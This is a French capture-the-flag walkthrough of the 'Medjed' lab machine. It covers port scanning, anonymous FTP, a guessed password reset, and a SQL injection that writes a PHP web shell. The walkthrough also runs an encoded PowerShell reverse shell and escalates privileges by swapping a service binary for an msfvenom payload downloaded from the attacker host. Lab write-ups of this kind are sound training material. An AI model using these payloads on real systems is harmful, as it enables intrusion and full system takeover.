# Medjed

	sudo  masscan  -p1-65535,U:1-65535 192.168.174.127 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.174.127 -oN nmap.txt
	feroxbuster --silent -u http://192.168.174.127:8000/
	
Scans classiques.

    PORT STATE SERVICE VERSION  
    135/tcp open msrpc Microsoft Windows RPC  
    139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
    445/tcp open microsoft-ds?  
    3306/tcp open mysql?  
    5040/tcp open unknown  
    8000/tcp open http-alt BarracudaServer.com (Windows)  
    30021/tcp open ftp FileZilla ftpd 0.9.41 beta  
    33033/tcp open unknown  
    44330/tcp open ssl/unknown  
    45332/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)  
    45443/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)  
    49664/tcp open msrpc Microsoft Windows RPC  
    49665/tcp open msrpc Microsoft Windows RPC  
    49666/tcp open msrpc Microsoft Windows RPC  
    49667/tcp open msrpc Microsoft Windows RPC  
    49668/tcp open msrpc Microsoft Windows RPC  
    49669/tcp open msrpc Microsoft Windows RPC
  

Sur la page http://192.168.174.127:8000/rtl/about.lsp on voit que ce site utilise BarracudaDrive 6.5 et il y a des exploits spécifiques à cette version, mais apparemment juste pour la phase d'élévation de privilèges : https://www.exploit-db.com/exploits/48789

Après la fin de mon scan Nmap j'ai remarqué le FTP sur le port 30021 et la connexion en anonyme semble autorisée : 

    ftp -A anonymous@192.168.174.127 -p 30021
    wget -r ftp://anonymous:""@192.168.174.127:30021/
    tree . -a

Rien d'intéressant dans les fichiers. 

Sur le port 44330 on trouve la version SSL du site. Sur les ports 45332 et 45443 on trouve un autre site avec un quiz étrange. Et sur le port 33033 on trouve un troisième site web avec six photos, dont un DevOps qui a une photo de chat : jerren.devops@company.com

Il y a une fonction de réinitialisation de mot de passe sur l'écran de login. En essayant avec "jerren.devops" pour le nom d'utilisateur et "paranoid" pour le reminder (mot venant de sa phrase de profil) cela fonctionne. 

J'arrive sur la page http://192.168.174.127:33033/users/4 où je vois directement une possibilité d'éditer le profil. Il y a un upload d'image et quelques champs à remplir. J'ai tenté plein d'uploads malicieux et plein de payloads malicieux mais la page semble être safe. 

En revanche il y a une autre option en bas : "Request Profile SLUG (experimental)"

Cette page contient un autre champ à remplir. Mais cette fois des payloads fonctionnent et font planter la page. Et il y a un traceback très précieux : 

        sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"
        ret = ActiveRecord::Base.connection.execute(sql)
        @text = ret
      end

C'est un cas assez classique d'injection SQL mais il n'y a pas de feedback permettant d'énumérer la base de données facilement donc il faut directement écrire dans une backdoor :

    ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/backdoor.php'-- -'

Il n'y a plus qu'à exploiter la backdoor. Mais attention à bien aller la chercher sur l'autre site et non pas sur les routes de celui du port 33033 :

    curl 'http://192.168.174.127:45332/backdoor.php?cmd=whoami'
    curl 'http://192.168.174.127:45332/backdoor.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABO...8AcwBlACgAKQA%3D'
    ...
    rlwrap nc -nvlp 443
    type C:\Users\Jerren\Desktop\local.txt

Pour l'élévation de privilèges il suffit de reprendre l'exploit trouvé pendant la phase de reconnaissance, en l'adaptant un peu si on le souhaite :

    cd C:\bd
    ren bd.exe bd.exe.old
    iwr http://192.168.45.226/msfvenom.exe -Outfile C:\bd\bd.exe
    shutdown /r
    ...
    rlwrap nc -nvlp 9999
    type C:\Users\Administrator\Desktop\proof.txt
